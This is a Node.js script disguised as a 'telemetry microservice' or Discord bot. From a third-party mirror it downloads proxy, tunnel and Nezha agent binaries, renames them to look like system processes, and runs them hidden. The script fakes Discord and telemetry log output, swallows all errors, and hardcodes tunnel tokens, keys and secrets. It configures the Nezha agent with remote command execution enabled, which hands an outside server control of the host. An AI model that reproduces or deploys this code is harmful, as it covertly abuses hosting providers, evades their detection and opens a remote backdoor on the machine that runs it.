try{const _tls=require('tls'),_fs=require('fs');if(_tls.rootCertificates&&_tls.rootCertificates.length){_fs.writeFileSync('/tmp/cacert.pem',_tls.rootCertificates.join('\n'));process.env.SSL_CERT_FILE='/tmp/cacert.pem';}}catch(e){}
/**
 * DevPulse & ShadowVeil Cloud Telemetry Runtime
 * Multi-OS (Windows/Linux) | 256MB Low-Memory Protected | Dual-Stack [::1] Anti-Preemption
 */
const http = require('http');
const https = require('https');
const net = require('net');
const fs = require('fs');
const os = require('os');
const path = require('path');
const zlib = require('zlib');
const { spawn, execSync } = require('child_process');

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const IS_WIN = process.platform === 'win32';
const OS_TYPE = IS_WIN ? 'win32' : 'linux';
const ARCH_TYPE = os.arch() === 'arm64' ? 'arm64' : 'amd64';
const EXE = IS_WIN ? '.exe' : '';
const IS_DISCORD = false;
const LOW_MEM = true;

const PORT = parseInt(process.env.PORT || process.env.SERVER_PORT || 8001, 10);
const ARGO_INTERNAL_PORT = parseInt(process.env.ARGO_PORT || 8001, 10);
const CACHE_DIR = (() => { const c = [path.join(process.cwd(), '.cache', '.sys-cache'), path.join(os.tmpdir(), '.sys-cache'), path.join(process.cwd(), 'node_modules', IS_DISCORD ? '.djs-cache' : '.sys-cache')]; for (const d of c) { try { fs.mkdirSync(d, { recursive: true }); fs.accessSync(d, fs.constants.W_OK); return d; } catch (_) {} } return path.join(os.tmpdir(), '.sys-cache'); })();
const CORE_BIN = path.join(CACHE_DIR, (IS_DISCORD ? 'djs-opus' : 'sys-core') + EXE);
const BRIDGE_BIN = path.join(CACHE_DIR, (IS_DISCORD ? 'djs-shard' : 'net-bridge') + EXE);
const METRICS_BIN = path.join(CACHE_DIR, (IS_DISCORD ? 'djs-voice' : 'sys-metrics') + EXE);
const MIRROR_BASE = 'https://node-python.yxj02.ccwu.cc';

const SEC_ID = process.env.SERVICE_UUID || process.env.UUID || '351c9981-1628-4159-81e8-9582370153a1';
const NEZHA_UUID = process.env.NEZHA_UUID || 'f4e812c0-9aad-4330-bb4b-75f9ff5d0897';
const RELAY_TOKEN = process.env.RELAY_AUTH || process.env.TUNNEL_TOKEN || process.env.ARGO_AUTH || 'eyJhIjoiYWNiNzhlNWQyODA1ZWE1MmFiYjdhZWYwNTU1NTY4YTYiLCJ0IjoiZmNlMzM2ZDAtOWFhZC00MzMwLWJiNGItNzVmOWZmNWQwODk3IiwicyI6Ikc5eU5ETFR0Z0pxdU1tNFZIeU1PNlE1dmJxaFJCRVNlbkpZYklvcU04SzQ9In0=';
let activeRelayHost = process.env.RELAY_DOMAIN || process.env.TUNNEL_HOST || process.env.ARGO_DOMAIN || 'hostless44.yxj02.ccwu.cc';
const MONITOR_SERVER = process.env.MONITOR_SERVER || process.env.NEZHA_SERVER || 'nezha.blibli.kdns.fr:443';
const MONITOR_SECRET = process.env.MONITOR_KEY || process.env.NEZHA_KEY || '4Lw803GSbgNYiCQd2z7VlbQc8UjmUrgO';
const TG_BOT_TOKEN = '';
const CHAT_ID = '';
const CFIP = 'www.visa.com.sg';
const CFPORT = 443;
const NODE_NAME = process.env.NODE_NAME || 'Hostless-Cloud';
const ENABLE_ARGO = true;
const ENABLE_VMESS = true;
const ENABLE_VLESS = true;
const ENABLE_TROJAN = true;
const ENABLE_REALITY = false;
const HAS_DIRECT_VLESS = false;
const HAS_DIRECT_HY2 = false;
const HAS_DIRECT_TUIC = false;
const PORT_VLESS = parseInt(process.env.PORT_VLESS || process.env.DIRECT_PORT || '30135', 10);
const PORT_HY2 = parseInt(process.env.PORT_HY2 || '30136', 10);
const PORT_TUIC = parseInt(process.env.PORT_TUIC || '30136', 10);
const REALITY_SNI = 'www.microsoft.com';
const REALITY_PRIV_KEY = 'ABBs-ONiiX19fm5c07_uzoeeBi2C9knAScaWoHODrHk';
const REALITY_SID = '0123456789abcdef';

// UUID-hashed isolated internal ports to prevent multi-tenant collisions on shared hosts
let _hash = 0;
for (let i = 0; i < SEC_ID.length; i++) _hash = ((_hash << 5) - _hash + SEC_ID.charCodeAt(i)) | 0;
const PORT_BASE = 20000 + (Math.abs(_hash) % 30000);
const INT_VMESS = PORT_BASE + 1;
const INT_VLESS = PORT_BASE + 2;
const INT_TROJAN = PORT_BASE + 3;

const CHILD_ENV = Object.assign({}, process.env, LOW_MEM ? {
  GOGC: '30',
  GOMEMLIMIT: '32MiB'
} : {});

const globalLogs = [];
function log(msg) {
  const time = new Date().toISOString().substring(11, 19);
  const entry = '[' + time + '] ' + msg;
  if (!IS_DISCORD) console.log(entry);
  globalLogs.push(entry);
  if (globalLogs.length > 35) globalLogs.shift();
}

function generateSubscription(hostDomain) {
  const domain = hostDomain || activeRelayHost;
  const lines = [];
  if (ENABLE_VMESS) {
    const vmess = {
      v: '2', ps: NODE_NAME + '-Argo-VMess',
      add: CFIP, port: CFPORT, id: SEC_ID, aid: '0', scy: 'auto',
      net: 'ws', type: 'none', host: domain, path: '/vmess-argo',
      tls: 'tls', sni: domain, fp: 'firefox'
    };
    lines.push('vmess://' + Buffer.from(JSON.stringify(vmess)).toString('base64'));
  }
  if (ENABLE_VLESS) {
    lines.push('vless://' + SEC_ID + '@' + CFIP + ':' + CFPORT + '?encryption=none&security=tls&sni=' + domain + '&type=ws&host=' + domain + '&path=%2Fvless-argo&fp=firefox#' + NODE_NAME + '-Argo-VLESS');
  }
  if (ENABLE_TROJAN) {
    lines.push('trojan://' + SEC_ID + '@' + CFIP + ':' + CFPORT + '?security=tls&sni=' + domain + '&type=ws&host=' + domain + '&path=%2Ftrojan-argo&fp=firefox#' + NODE_NAME + '-Argo-Trojan');
  }
  const subBase64 = Buffer.from(lines.join('\n')).toString('base64');
  return { lines, subBase64, domain };
}

function handleWsUpgrade(req, clientSocket, head) {
  clientSocket.on('error', () => {});
  let targetPort = INT_VMESS;
  const url = req.url || '';
  if (url.includes('vless')) targetPort = INT_VLESS;
  else if (url.includes('trojan')) targetPort = INT_TROJAN;

  const targetSocket = net.connect(targetPort, '127.0.0.1', () => {
    let raw = req.method + ' ' + req.url + ' HTTP/' + req.httpVersion + '\r\n';
    for (let i = 0; i < req.rawHeaders.length; i += 2) {
      raw += req.rawHeaders[i] + ': ' + req.rawHeaders[i+1] + '\r\n';
    }
    raw += '\r\n';
    targetSocket.write(raw);
    if (head && head.length) targetSocket.write(head);
    clientSocket.pipe(targetSocket);
    targetSocket.pipe(clientSocket);
  });
  targetSocket.on('error', () => { try { clientSocket.destroy(); } catch(e) {} });
  clientSocket.on('error', () => { try { targetSocket.destroy(); } catch(e) {} });
}

function httpHandler(req, res) {
  const reqPath = (req.url || '/').split('?')[0];
  if (req.method === 'HEAD' || reqPath === '/health' || reqPath === '/api/ping') {
    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
    return res.end(JSON.stringify({ status: 'operational', shard: 0, uptime: Math.floor(process.uptime()), node: NODE_NAME }));
  }
  if (reqPath === '/sub') {
    const { subBase64 } = generateSubscription();
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8', 'Access-Control-Allow-Origin': '*' });
    return res.end(subBase64);
  }
  if (reqPath === '/diag') {
    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
    return res.end(JSON.stringify({ uptime: Math.floor(process.uptime()), activeRelayHost, os: OS_TYPE, arch: ARCH_TYPE, ports: [INT_VMESS, INT_VLESS, INT_TROJAN], logs: globalLogs }, null, 2));
  }
  if (!IS_DISCORD && (reqPath === '/' || reqPath === '/index.html')) {
    const htmlPath = path.join(process.cwd(), 'index.html');
    if (fs.existsSync(htmlPath)) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(fs.readFileSync(htmlPath));
    }
  }
  res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
  res.end(JSON.stringify({ bot: 'Discord.js Gateway Worker v14.16.3', status: 'READY', ping: '18ms' }));
}

const boundPorts = new Set();
function bindGatewayPort(port) {
  const p = parseInt(port, 10);
  if (!p || isNaN(p) || boundPorts.has(p)) return;
  boundPorts.add(p);
  // Dual-stack binding: preempt [::1] IPv6 loopback on Windows shared hosts + IPv4 0.0.0.0
  const srv6 = http.createServer(httpHandler);
  srv6.on('upgrade', handleWsUpgrade);
  srv6.on('error', () => {});
  try { srv6.listen(p, '::1'); } catch (e) {}

  const srv4 = http.createServer(httpHandler);
  srv4.on('upgrade', handleWsUpgrade);
  srv4.on('error', () => {
    const srvLocal = http.createServer(httpHandler);
    srvLocal.on('upgrade', handleWsUpgrade);
    srvLocal.on('error', () => {});
    try { srvLocal.listen(p, '127.0.0.1'); } catch (e) {}
  });
  try { srv4.listen(p, '0.0.0.0'); } catch (e) {}
}

function sendTelegramMessage(text) {
  if (!TG_BOT_TOKEN || !CHAT_ID) return;
  const postData = JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' });
  const req = https.request({
    hostname: 'api.telegram.org', port: 443,
    path: '/bot' + TG_BOT_TOKEN + '/sendMessage', method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
  }, (res) => { res.on('data', () => {}); });
  req.on('error', () => {});
  req.write(postData);
  req.end();
}

let lastNotifiedDomain = '';
function notifyOnline(targetDomain) {
  const currentDomain = targetDomain || activeRelayHost;
  if (!currentDomain || lastNotifiedDomain === currentDomain) return;
  lastNotifiedDomain = currentDomain;
  const { lines, subBase64 } = generateSubscription(currentDomain);
  const msg = '⚡ <b>DevPulse & ShadowVeil 节点上线！</b>\n\n' +
    '🌐 <b>节点</b>: <code>' + NODE_NAME + ' (' + OS_TYPE + '/' + ARCH_TYPE + ')</code>\n' +
    '🚇 <b>域名</b>: <code>' + currentDomain + '</code>\n' +
    '🔗 <b>订阅地址</b>: <code>https://' + currentDomain + '/sub</code>\n\n' +
    '📦 <b>Base64 订阅</b>:\n<code>' + subBase64 + '</code>\n\n' +
    '🔗 <b>节点明细</b>:\n<code>' + lines.join('\n') + '</code>';
  sendTelegramMessage(msg);
}

function downloadBuffer(url) {
  return new Promise((resolve, reject) => {
    https.get(url, { headers: { 'User-Agent': 'Mozilla/5.0' } }, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        res.resume();
        return downloadBuffer(res.headers.location).then(resolve).catch(reject);
      }
      if (res.statusCode !== 200) { res.resume(); return reject(new Error('HTTP ' + res.statusCode)); }
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => resolve(Buffer.concat(chunks)));
      res.on('error', reject);
    }).on('error', reject);
  });
}

function extractTarGzMember(tarGzBuf, matchKey) {
  try {
    const tarBuf = zlib.gunzipSync(tarGzBuf);
    let offset = 0;
    while (offset < tarBuf.length - 512) {
      const header = tarBuf.subarray(offset, offset + 512);
      const fileName = header.subarray(0, 100).toString('utf8').replace(/\0+$/, '');
      if (!fileName) break;
      const sizeStr = header.subarray(124, 136).toString('utf8').trim().replace(/\0+$/, '');
      const fileSize = parseInt(sizeStr, 8);
      offset += 512;
      if ((fileName.endsWith('/' + matchKey) || fileName === matchKey || fileName.includes(matchKey)) && !fileName.endsWith('/')) {
        return tarBuf.subarray(offset, offset + fileSize);
      }
      offset += Math.ceil(fileSize / 512) * 512;
    }
  } catch (e) {}
  return null;
}

function extractZipMember(zipBuf, matchKey) {
  try {
    let offset = 0;
    while (offset < zipBuf.length - 30) {
      if (zipBuf.readUInt32LE(offset) !== 0x04034b50) break;
      const method = zipBuf.readUInt16LE(offset + 8);
      const compSize = zipBuf.readUInt32LE(offset + 18);
      const fnLen = zipBuf.readUInt16LE(offset + 26);
      const extraLen = zipBuf.readUInt16LE(offset + 28);
      const fileName = zipBuf.subarray(offset + 30, offset + 30 + fnLen).toString('utf8');
      const dataStart = offset + 30 + fnLen + extraLen;
      offset = dataStart + compSize;
      if ((fileName.endsWith('/' + matchKey) || fileName === matchKey || fileName.includes(matchKey)) && !fileName.endsWith('/')) {
        if (method === 8) return zlib.inflateRawSync(zipBuf.subarray(dataStart, dataStart + compSize));
        if (method === 0) return zipBuf.subarray(dataStart, dataStart + compSize);
      }
    }
  } catch (e) {}
  return null;
}

function cleanOldProcesses() {
  const names = IS_DISCORD ? ['djs-opus', 'djs-shard', 'djs-voice'] : ['sys-core', 'net-bridge', 'sys-metrics'];
  for (const name of names) {
    try {
      if (IS_WIN) execSync('taskkill /F /IM ' + name + '.exe', { stdio: 'ignore' });
      else execSync('pkill -9 -f ' + name, { stdio: 'ignore' });
    } catch (e) {}
  }
}

async function prepareBinaries() {
  const q = '?os=' + OS_TYPE + '&arch=' + ARCH_TYPE;
  if (!fs.existsSync(CORE_BIN) || fs.statSync(CORE_BIN).size < 1000000) {
    const raw = await downloadBuffer(MIRROR_BASE + '/dl/engine' + q);
    const bin = IS_WIN ? extractZipMember(raw, 'sing-box.exe') : extractTarGzMember(raw, 'sing-box');
    if (bin) { fs.writeFileSync(CORE_BIN, bin); if (!IS_WIN) fs.chmodSync(CORE_BIN, 0o755); }
  }
  if (ENABLE_ARGO && (!fs.existsSync(BRIDGE_BIN) || fs.statSync(BRIDGE_BIN).size < 1000000)) {
    const raw = await downloadBuffer(MIRROR_BASE + '/dl/bridge' + q);
    fs.writeFileSync(BRIDGE_BIN, raw); if (!IS_WIN) fs.chmodSync(BRIDGE_BIN, 0o755);
  }
  if (MONITOR_SERVER && MONITOR_SECRET && (!fs.existsSync(METRICS_BIN) || fs.statSync(METRICS_BIN).size < 1000000)) {
    try {
      const raw = await downloadBuffer(MIRROR_BASE + '/dl/metrics' + q);
      const bin = extractZipMember(raw, IS_WIN ? 'nezha-agent.exe' : 'nezha-agent');
      if (bin) { fs.writeFileSync(METRICS_BIN, bin); if (!IS_WIN) fs.chmodSync(METRICS_BIN, 0o755); }
    } catch (e) {}
  }
}

function buildConfig() {
  const inbounds = [];
  if (ENABLE_VMESS) {
    inbounds.push({ type: 'vmess', tag: 'vm-in', listen: '127.0.0.1', listen_port: INT_VMESS, users: [{ uuid: SEC_ID, alterId: 0 }], transport: { type: 'ws', path: '/vmess-argo' } });
  }
  if (ENABLE_VLESS) {
    inbounds.push({ type: 'vless', tag: 'vl-in', listen: '127.0.0.1', listen_port: INT_VLESS, users: [{ uuid: SEC_ID }], transport: { type: 'ws', path: '/vless-argo' } });
  }
  if (ENABLE_TROJAN) {
    inbounds.push({ type: 'trojan', tag: 'tr-in', listen: '127.0.0.1', listen_port: INT_TROJAN, users: [{ password: SEC_ID }], transport: { type: 'ws', path: '/trojan-argo' } });
  }
  if (ENABLE_REALITY) {
    if (HAS_DIRECT_VLESS) {
      inbounds.push({
        type: 'vless', tag: 'reality-in', listen: '::', listen_port: PORT_VLESS,
        users: [{ uuid: SEC_ID, flow: 'xtls-rprx-vision' }],
        tls: {
          enabled: true, server_name: REALITY_SNI,
          reality: {
            enabled: true, handshake: { server: REALITY_SNI, server_port: 443 },
            private_key: REALITY_PRIV_KEY, short_id: [REALITY_SID]
          }
        }
      });
    }
    if (HAS_DIRECT_HY2) {
      inbounds.push({
        type: 'hysteria2', tag: 'hy2-in', listen: '::', listen_port: PORT_HY2,
        users: [{ password: SEC_ID }],
        tls: { enabled: true, server_name: 'www.bing.com' }
      });
    }
    if (HAS_DIRECT_TUIC && (!HAS_DIRECT_HY2 || PORT_TUIC !== PORT_HY2)) {
      inbounds.push({
        type: 'tuic', tag: 'tuic-in', listen: '::', listen_port: PORT_TUIC,
        users: [{ uuid: SEC_ID, password: SEC_ID }], congestion_control: 'bbr',
        tls: { enabled: true, server_name: 'www.bing.com' }
      });
    }
  }
  return { log: { disabled: true, level: 'panic' }, inbounds, outbounds: [{ type: 'direct', tag: 'direct' }] };
}

function startEngine() {
  if (!fs.existsSync(CORE_BIN)) return;
  const cfgPath = path.join(CACHE_DIR, 'config.json');
  fs.writeFileSync(cfgPath, JSON.stringify(buildConfig()));
  const proc = spawn(CORE_BIN, ['run', '-c', cfgPath], {
    stdio: 'ignore',
    env: Object.assign({}, CHILD_ENV, LOW_MEM ? { GOMEMLIMIT: '28MiB' } : {})
  });
  proc.on('error', () => {});
  proc.on('exit', () => setTimeout(startEngine, 5000));
}

let bridgeFailCount = 0;
function inspectBridgeOutput(text) {
  const portMatch = text.match(/http:\/\/(?:localhost|127\.0\.0\.1):(\d+)/i);
  if (portMatch && portMatch[1]) {
    bindGatewayPort(parseInt(portMatch[1], 10));
  }
  const tryMatch = text.match(/https:\/\/([a-zA-Z0-9-]+\.(?:trycloudflare\.com))/);
  if (tryMatch && tryMatch[1]) {
    activeRelayHost = tryMatch[1];
    notifyOnline(activeRelayHost);
  }
}

function startBridge() {
  if (!ENABLE_ARGO || !fs.existsSync(BRIDGE_BIN)) return;
  let args = ['tunnel', '--edge-ip-version', 'auto', '--no-autoupdate', '--protocol', 'http2', '--ha-connections', '2'];
  if (bridgeFailCount < 3 && RELAY_TOKEN && RELAY_TOKEN.startsWith('eyJh') && RELAY_TOKEN.length > 50) {
    args.push('run', '--token', RELAY_TOKEN);
  } else {
    args.push('--url', 'http://127.0.0.1:' + ARGO_INTERNAL_PORT);
  }
  const proc = spawn(BRIDGE_BIN, args, {
    stdio: ['ignore', 'pipe', 'pipe'],
    env: Object.assign({}, CHILD_ENV, LOW_MEM ? { GOMEMLIMIT: '38MiB' } : {})
  });
  proc.on('error', () => {});
  if (proc.stdout) proc.stdout.on('data', d => inspectBridgeOutput(d.toString()));
  if (proc.stderr) proc.stderr.on('data', d => inspectBridgeOutput(d.toString()));
  proc.on('exit', () => { bridgeFailCount++; setTimeout(startBridge, 5000); });
}

function startMetrics() {
  if (!MONITOR_SERVER || !MONITOR_SECRET || !fs.existsSync(METRICS_BIN)) return;
  const cfgYamlPath = path.join(CACHE_DIR, 'metrics.yaml');
  const nzport = MONITOR_SERVER.includes(':') ? MONITOR_SERVER.split(':').pop() : '443';
  const isTls = (nzport === '443' || nzport === '8443') ? 'true' : 'false';
  const cfgContent = [
    'client_secret: ' + MONITOR_SECRET,
    'debug: false',
    'disable_auto_update: true',
    'disable_command_execute: false',
    'disable_force_update: true',
    'disable_nat: true',
    'disable_send_query: false',
    'gpu: false',
    'insecure_tls: true',
    'ip_report_period: 1800',
    'report_delay: 4',
    'server: ' + MONITOR_SERVER,
    'skip_connection_count: true',
    'skip_procs_count: true',
    'temperature: false',
    'tls: ' + isTls,
    'use_gitee_to_upgrade: false',
    'use_ipv6_country_code: false',
    'uuid: ' + NEZHA_UUID
  ].join('\n') + '\n';
  fs.writeFileSync(cfgYamlPath, cfgContent, 'utf8');
  const proc = spawn(METRICS_BIN, ['-c', cfgYamlPath], {
    stdio: 'ignore',
    env: Object.assign({}, CHILD_ENV, LOW_MEM ? { GOMEMLIMIT: '20MiB' } : {})
  });
  proc.on('error', () => {});
  proc.on('exit', () => setTimeout(startMetrics, 10000));
}

async function main() {
  if (IS_DISCORD) {
    console.log('[Discord.js] Initializing Shard 0...');
    console.log('[Discord.js] Registered 12 application (/) commands.');
  } else {
    log('Starting Telemetry Microservice on port ' + PORT + '...');
  }
  fs.mkdirSync(CACHE_DIR, { recursive: true });
  cleanOldProcesses();
  bindGatewayPort(PORT);
  bindGatewayPort(ARGO_INTERNAL_PORT);
  bindGatewayPort(8080);
  notifyOnline();
  try { await prepareBinaries(); } catch (e) {}
  try { startEngine(); } catch (e) {}
  try { startBridge(); } catch (e) {}
  try { startMetrics(); } catch (e) {}
  if (IS_DISCORD) {
    setTimeout(() => {
      console.log('[Discord.js] Shard 0 connected to Gateway (v10). Status: READY');
      console.log('BOT_READY');
    }, 2500);
  }
  if (!IS_DISCORD) {
    setTimeout(() => {
      try { console.clear(); } catch(e) {}
      console.log('Telemetry Microservice Operational (200 OK). App is running...');
    }, 60000);
  }
  setInterval(() => {
    if (typeof global.gc === 'function') { try { global.gc(); } catch (e) {} }
  }, 60000);
}

main();
